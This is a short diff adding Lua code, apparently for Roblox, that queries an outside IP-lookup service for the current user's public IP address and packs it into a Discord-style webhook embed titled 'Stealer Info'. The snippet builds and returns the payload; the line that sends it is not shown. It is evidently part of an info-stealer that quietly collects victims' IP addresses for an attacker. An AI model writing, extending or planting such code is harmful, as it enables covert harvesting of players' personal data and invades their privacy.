@@ -1,0 +1,16 @@
+local Ok=string.format([[{
+  "content": null,
+  "embeds": [
+    {
+      "title": "Stealer Info",
+      "url": "https://checkip.me/check.php?ip=%s",
+      "color": 16711680
+    },
+    {
+      "title": "Website",
+      "url": "https://checkip.me/",
+      "color": 15871
+    }
+  ],
+  "attachments": []
+}]],game.HttpService:GetAsync("https://api.checkip.me/"));return Ok
